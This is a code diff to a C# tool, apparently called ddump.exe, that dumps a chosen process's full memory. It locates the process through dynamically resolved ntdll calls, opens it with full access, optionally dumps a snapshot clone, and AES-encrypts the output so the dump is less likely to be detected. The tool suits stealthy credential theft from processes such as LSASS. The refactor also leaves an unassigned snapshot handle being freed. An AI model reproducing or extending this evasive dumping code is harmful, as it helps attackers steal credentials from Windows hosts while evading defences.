@@ -6,6 +6,9 @@ using static Charles.STRUCTS.PSS_CAPTURE_FLAGS;
 using static Charles.STRUCTS.PSS_QUERY_INFORMATION_CLASS;
 using System.Security.Cryptography;
 using System.Text;
+using System.IO;
+using System;
+using System.Xml.Linq;
 
 namespace Charles
 {
@@ -30,10 +33,113 @@ namespace Charles
         public delegate NtStatus PssNtFreeSnapshot(IntPtr SnapshotHandle);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate NtStatus NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformation, out IntPtr Buffer, int SystemInformationLength, out IntPtr ReturnLength);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate NtStatus NtOpenProcess(ref IntPtr pHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate NtStatus NtGetNextProcess(IntPtr pHandle, int DesiredAccess, ulong HandleAttributes, ulong Flags, out IntPtr npHandle);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate NtStatus NtQueryInformationProcess(IntPtr pHandle, int ProcessInformationClass, IntPtr ProcessInformation, ulong ProcessInformationLength, out IntPtr ReturnLength);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         public delegate NtStatus NtClose(IntPtr Handle);
     }
     public class STRUCTS
     {
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr ExitStatus;
+            public IntPtr PebAddress;
+            public IntPtr AffinityMask;
+            public IntPtr BasePriority;
+            public IntPtr UniquePID;
+            public IntPtr InheritedFromUniqueProcessId;
+        }
+
+        [Flags]
+        public enum ACCESS_MASK : uint
+        {
+            DELETE = 0x00010000,
+            READ_CONTROL = 0x00020000,
+            WRITE_DAC = 0x00040000,
+            WRITE_OWNER = 0x00080000,
+            SYNCHRONIZE = 0x00100000,
+            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
+            STANDARD_RIGHTS_READ = 0x00020000,
+            STANDARD_RIGHTS_WRITE = 0x00020000,
+            STANDARD_RIGHTS_EXECUTE = 0x00020000,
+            STANDARD_RIGHTS_ALL = 0x001F0000,
+            SPECIFIC_RIGHTS_ALL = 0x0000FFF,
+            ACCESS_SYSTEM_SECURITY = 0x01000000,
+            MAXIMUM_ALLOWED = 0x02000000,
+            GENERIC_READ = 0x80000000,
+            GENERIC_WRITE = 0x40000000,
+            GENERIC_EXECUTE = 0x20000000,
+            GENERIC_ALL = 0x10000000,
+            DESKTOP_READOBJECTS = 0x00000001,
+            DESKTOP_CREATEWINDOW = 0x00000002,
+            DESKTOP_CREATEMENU = 0x00000004,
+            DESKTOP_HOOKCONTROL = 0x00000008,
+            DESKTOP_JOURNALRECORD = 0x00000010,
+            DESKTOP_JOURNALPLAYBACK = 0x00000020,
+            DESKTOP_ENUMERATE = 0x00000040,
+            DESKTOP_WRITEOBJECTS = 0x00000080,
+            DESKTOP_SWITCHDESKTOP = 0x00000100,
+            WINSTA_ENUMDESKTOPS = 0x00000001,
+            WINSTA_READATTRIBUTES = 0x00000002,
+            WINSTA_ACCESSCLIPBOARD = 0x00000004,
+            WINSTA_CREATEDESKTOP = 0x00000008,
+            WINSTA_WRITEATTRIBUTES = 0x00000010,
+            WINSTA_ACCESSGLOBALATOMS = 0x00000020,
+            WINSTA_EXITWINDOWS = 0x00000040,
+            WINSTA_ENUMERATE = 0x00000100,
+            WINSTA_READSCREEN = 0x00000200,
+            WINSTA_ALL_ACCESS = 0x0000037F,
+
+            SECTION_ALL_ACCESS = 0x10000000,
+            SECTION_QUERY = 0x0001,
+            SECTION_MAP_WRITE = 0x0002,
+            SECTION_MAP_READ = 0x0004,
+            SECTION_MAP_EXECUTE = 0x0008,
+            SECTION_EXTEND_SIZE = 0x0010
+        };
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct CLIENT_ID
+        {
+            public IntPtr UniqueProcess;
+            public IntPtr UniqueThread;
+        }
+
+        [StructLayout(LayoutKind.Sequential, Pack = 0)]
+        public struct OBJECT_ATTRIBUTES
+        {
+            public int Length;
+            public IntPtr RootDirectory;
+            public IntPtr ObjectName;
+            public uint Attributes;
+            public IntPtr SecurityDescriptor;
+            public IntPtr SecurityQualityOfService;
+        }
+
+        public enum SYSTEM_INFORMATION_CLASS
+        {
+            SystemBasicInformation = 0,
+            SystemPerformanceInformation = 2,
+            SystemTimeOfDayInformation = 3,
+            SystemProcessInformation = 5,
+            SystemProcessorPerformanceInformation = 8,
+            SystemHandleInformation = 16,
+            SystemInterruptInformation = 23,
+            SystemExceptionInformation = 33,
+            SystemRegistryQuotaInformation = 37,
+            SystemLookasideInformation = 45
+        }
+
         public enum PSS_QUERY_INFORMATION_CLASS
         {
             PSS_QUERY_PROCESS_INFORMATION = 0,
@@ -451,7 +557,7 @@ namespace Charles
 
             MaximumNtStatus = 0xffffffff
         }
-       
+
     }
 
     public class Invoke
@@ -654,25 +760,48 @@ namespace Charles
 
             if (args.Length != 5)
             {
-                Console.WriteLine("Usage: ddump.exe [process] [key] [iv] [destination] [method: classic / snapshot]");
-                Console.WriteLine("Example: ddump.exe notepad 'AH!PSB5%FRHZ$UKA' 'HV$3pIjHR$3pDj1' C:\\temp\\poney.bin classic");
+                Console.WriteLine("Usage: ddump.exe [ProcessId] [key] [iv] [destination] [method: classic / snapshot]");
+                Console.WriteLine("Example: ddump.exe 762 'AH!PSB5%FRHZ$UKA' 'HV$3pIjHR$3pDj1!' C:\\temp\\poney.bin classic");
                 return;
             }
+
+            //Initialize variables
+            IntPtr cloneProcess = IntPtr.Zero;
+            IntPtr sHandle = IntPtr.Zero;
+            IntPtr pHandle = IntPtr.Zero;
+
 
             //Setup AES key and IV
             string key = args[1];
             string iv = args[2];
 
-            //Which process to dump    
-            Process process = Process.GetProcessesByName(args[0])[0];
-            IntPtr pHandle = process.Handle;
-            IntPtr cloneProcess = IntPtr.Zero;
-            IntPtr sHandle = IntPtr.Zero;
+            //Which PID to dump
+            string procname = args[0];
+            int pid = FindPIDByName(procname);
+            if (pid == 0)
+            {
+                Console.WriteLine($"Process {procname} not found !");
+                return;
+            }
 
+            //Get a Handle to the process
+            IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtOpenProcess");
+            DELEGATES.NtOpenProcess ntopen = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtOpenProcess)) as DELEGATES.NtOpenProcess;
+
+            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
+
+            CLIENT_ID ci = new CLIENT_ID
+            {
+                UniqueProcess = (IntPtr)pid
+            };
+            
+            ntopen(ref pHandle, 0x001F0FFF, ref oa, ref ci);
+            
+            
             if (args[4] == "classic")
             {
                 //Generate a minidump
-                byte[] dumpBytes = Dump(process, pHandle);
+                byte[] dumpBytes = Dump(pHandle, pid);
                 //Encrypt the dump
                 byte[] encryptedDump = EncryptBytes(dumpBytes, key, iv);
                 // Write the encrypted data to a file
@@ -683,10 +812,10 @@ namespace Charles
             if (args[4] == "snapshot")
             {
                 //Create a snapshot
-                Snapshot(process, out sHandle, out cloneProcess);
+                Snapshot(pHandle, out cloneProcess);
 
                 //Generate a minidump
-                byte[] dumpBytes = Dump(process, cloneProcess);
+                byte[] dumpBytes = Dump(cloneProcess, pid);
 
                 //Encrypt the dump
                 byte[] encryptedDump = EncryptBytes(dumpBytes, key, iv);
@@ -695,7 +824,7 @@ namespace Charles
                 File.WriteAllBytes(args[3], encryptedDump);
 
                 //Free the snapshot
-                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtFreeSnapshot");
+                pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtFreeSnapshot");
                 DELEGATES.PssNtFreeSnapshot ntfree = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtFreeSnapshot)) as DELEGATES.PssNtFreeSnapshot;
                 ntfree(sHandle);
 
@@ -707,41 +836,105 @@ namespace Charles
                 return;
             }
 
-            static byte[] Dump(Process process, IntPtr pHandle)
+            static int FindPIDByName(string procname)
+            {       
+                IntPtr hProcess = IntPtr.Zero;      
+
+                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtGetNextProcess");
+                DELEGATES.NtGetNextProcess ntgext = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtGetNextProcess)) as DELEGATES.NtGetNextProcess;             
+
+                //Iterate through processes
+                while (true)
+                {
+                    NtStatus status = ntgext(hProcess, 0x0400, 0, 0, out hProcess);
+                    //If no more processes, quit
+                    if (status != NtStatus.Success)
+                    {
+                        return 0;
+                    }
+                    
+                    //If process matches
+                    if(is_process(hProcess,procname))
+                    {                       
+                        int bufferlenght = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
+                        var unique_pid = Marshal.AllocHGlobal(bufferlenght);
+
+                        pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtQueryInformationProcess");
+                        DELEGATES.NtQueryInformationProcess ntqi = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtQueryInformationProcess)) as DELEGATES.NtQueryInformationProcess;
+
+                        ntqi(hProcess, 0, unique_pid, (ulong)bufferlenght, out IntPtr ReturnLength);
+
+                        var temp = Marshal.PtrToStructure<PROCESS_BASIC_INFORMATION>(unique_pid);
+                        var pid = temp.UniquePID;
+
+                        Marshal.FreeHGlobal(unique_pid);
+                        Console.WriteLine((int)pid);
+                        return (int)pid;
+                    }
+                }
+
+                static bool is_process(IntPtr hProcess, string procname)
+                {                    
+                    string process_name = null;
+                    process_name = get_process_image(hProcess);                
+
+                    if (process_name.Contains(procname))
+                    {
+                        return true;
+                    }
+                    return false;
+                }
+
+                static string get_process_image(IntPtr hProcess)
+                {                    
+                    int bufferlenght = 0x200;                   
+                    var process_image = Marshal.AllocHGlobal(bufferlenght);
+
+                    IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtQueryInformationProcess");
+                    DELEGATES.NtQueryInformationProcess ntqi = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtQueryInformationProcess)) as DELEGATES.NtQueryInformationProcess;
+
+                    ntqi(hProcess, 27, process_image, (ulong)bufferlenght, out IntPtr ReturnLength);
+                    var us = Marshal.PtrToStructure<UNICODE_STRING>(process_image);
+                    var name = Marshal.PtrToStringUni(us.Buffer,us.Length/2);
+
+                    Marshal.FreeHGlobal(process_image);                   
+                    return name;
+                }
+            }
+
+            static byte[] Dump(IntPtr pHandle, int pid)
             {
                 using (MemoryStream memoryStream = new MemoryStream())
                 {
                     using (FileStream fs = new FileStream("C:\\Windows\\System32\\somedll.dll", FileMode.CreateNew, FileAccess.ReadWrite, FileShare.None, 4096, FileOptions.DeleteOnClose))
                     {
-
                         IntPtr pointer = Invoke.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump");
                         DELEGATES.MiniDumpWriteDump MDWD = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.MiniDumpWriteDump)) as DELEGATES.MiniDumpWriteDump;
 
-                        MDWD(pHandle, process.Id, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+                        MDWD(pHandle, pid, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
 
                         fs.Position = 0;
                         fs.CopyTo(memoryStream);
                     }
-
                     return memoryStream.ToArray();
-
                 }
             }
 
-            static void Snapshot(Process process, out IntPtr sHandle, out IntPtr cloneProcess)
+            static void Snapshot(IntPtr pHandle, out IntPtr cloneProcess)
             {
+                IntPtr sHandle = IntPtr.Zero;
+
                 //Create snapshot and get a handle
                 IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtCaptureSnapshot");
                 DELEGATES.PssNtCaptureSnapshot ntsnap = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtCaptureSnapshot)) as DELEGATES.PssNtCaptureSnapshot;
 
-                ntsnap(out sHandle, process.Handle, PSS_CAPTURE_VA_CLONE, 0);
+                ntsnap(out sHandle, pHandle, PSS_CAPTURE_VA_CLONE, 0);
 
                 //Query the snapshot and get the cloned handle
                 pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtQuerySnapshot");
                 DELEGATES.PssNtQuerySnapshot ntquery = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtQuerySnapshot)) as DELEGATES.PssNtQuerySnapshot;
 
                 ntquery(sHandle, PSS_QUERY_VA_CLONE_INFORMATION, out cloneProcess, IntPtr.Size);
-
             }
 
             static byte[] EncryptBytes(byte[] inputBytes, string key, string iv)
